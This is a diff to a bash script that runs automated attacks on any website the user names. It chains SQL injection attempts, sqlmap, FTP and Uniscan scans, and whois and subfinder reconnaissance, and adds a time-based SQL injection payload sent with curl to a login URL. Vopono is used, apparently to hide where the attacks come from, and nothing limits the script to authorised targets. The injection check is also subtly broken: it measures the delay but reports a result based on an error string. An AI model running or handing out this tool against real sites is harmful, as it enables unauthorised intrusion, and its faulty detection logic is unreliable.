@@ -215,76 +215,99 @@ perform_whois_lookup() {
     local results_dir="$2"
     local result
     result=$(run_command whois "$target_url")
-    local output_file="$results_dir/whois_lookup.txt"
+        local output_file="$results_dir/whois_lookup.txt"
     save_to_file "$output_file" "$result"
-echo "Saved Whois lookup results to $output_file"
+    echo "Saved Whois lookup results to $output_file"
 }
 
+# Function to perform a Subfinder scan
 perform_subfinder_scan() {
-local target_url=”$1”
-local results_dir=”$2”
-local result
-result=$(run_command subfinder -d “$target_url”)
-local output_file=”$results_dir/subfinder_scan.txt”
-save_to_file “$output_file” “$result”
-echo “Saved Subfinder results to $output_file”
+    local target_url="$1"
+    local results_dir="$2"
+    local result
+    result=$(run_command subfinder -d "$target_url")
+    local output_file="$results_dir/subfinder_scan.txt"
+    save_to_file "$output_file" "$result"
+    echo "Saved Subfinder scan results to $output_file"
 }
-start_vpn() {
-local vpn_name=”$1”
-echo “Starting VPN connection using Vopono…”
-run_sudo_command vopono connect “$vpn_name”
+
+# Function to perform a custom SQL injection test
+perform_custom_sql_injection_test() {
+    local target_url="$1"
+    local results_dir="$2"
+    local login_url="${target_url}/login?username=admin' AND SLEEP(5)=0--&password=a"
+    
+    local start_time=$(date +%s%N)
+    local response=$(curl -s "$login_url")
+    local end_time=$(date +%s%N)
+    
+    local elapsed_time=$(( (end_time - start_time) / 1000000 ))
+    
+    if echo "$response" | grep -q "Database error"; then
+        echo "Vulnerability found!"
+        echo "Access time: ${elapsed_time} ms"
+        save_to_file "$results_dir/custom_sql_injection_test.txt" "Vulnerability found! Access time: ${elapsed_time} ms"
+    else
+        echo "Vulnerability not found."
+        save_to_file "$results_dir/custom_sql_injection_test.txt" "Vulnerability not found."
+    fi
 }
-stop_vpn() {
-echo “Stopping VPN connection using Vopono…”
-run_sudo_command vopono disconnect
-}
+
+# Main function to orchestrate the security scans
 main() {
-# Install necessary tools
-install_tools
-# Print the animated header
-print_header
-
-# Clear the screen
-clear_screen
-
-# Get the target URL from the user
-read -p "Enter the target URL: " target_url
-
-# Create a results directory
-local results_dir="./results"
-mkdir -p "$results_dir"
-
-# Start VPN connection
-start_vpn "your_vpn_name"
-
-# Check if the website is accessible
-if check_website_status "$target_url"; then
-    echo "Starting SQL Injection attempts..."
-    perform_sql_injection "$target_url" "$results_dir"
+    # Install necessary tools
+    install_tools
     
-    echo "Starting SQLmap scan..."
-    perform_sqlmap_scan "$target_url" "$results_dir"
+    # Print the animated header
+    print_header
     
-    echo "Starting FTP scan..."
-    perform_ftp_scan "$target_url" "$results_dir"
+    # Clear the screen
+    clear_screen
     
-    echo "Starting Uniscan scan..."
-    perform_uniscan_scan "$target_url" "$results_dir"
+    # Get the target URL from the user
+    read -p "Enter the target URL: " target_url
     
-    echo "Starting Whois lookup..."
-    perform_whois_lookup "$target_url" "$results_dir"
+    # Create a results directory
+    local results_dir="./results"
+    mkdir -p "$results_dir"
     
-    echo "Starting Subfinder scan..."
-    perform_subfinder_scan "$target_url" "$results_dir"
-    
-    echo "All scans completed. Results are saved in the $results_dir directory."
-else
-    echo "The website is not accessible. Exiting..."
-fi
-
-# Stop VPN connection
-stop_vpn
+    # Check if the website is accessible
+    if check_website_status "$target_url"; then
+        # Start Vopono
+        echo "Starting Vopono..."
+        run_command vopono start
+        
+        echo "Starting SQL Injection attempts..."
+        perform_sql_injection "$target_url" "$results_dir"
+        
+        echo "Starting SQLmap scan..."
+        perform_sqlmap_scan "$target_url" "$results_dir"
+        
+        echo "Starting FTP scan..."
+        perform_ftp_scan "$target_url" "$results_dir"
+        
+        echo "Starting Uniscan scan..."
+        perform_uniscan_scan "$target_url" "$results_dir"
+        
+        echo "Starting Whois lookup..."
+        perform_whois_lookup "$target_url" "$results_dir"
+        
+        echo "Starting Subfinder scan..."
+        perform_subfinder_scan "$target_url" "$results_dir"
+        
+        echo "Starting custom SQL injection test..."
+        perform_custom_sql_injection_test "$target_url" "$results_dir"
+        
+        echo "Accessing Seclists database..."
+        access_seclists
+        
+        # Stop Vopono
+        echo "Stopping Vopono..."
+        run_command vopono stop
+    else
+        echo "The website is not accessible. Exiting..."
+    fi
 }
+
+# Run the main function
 main
-
-
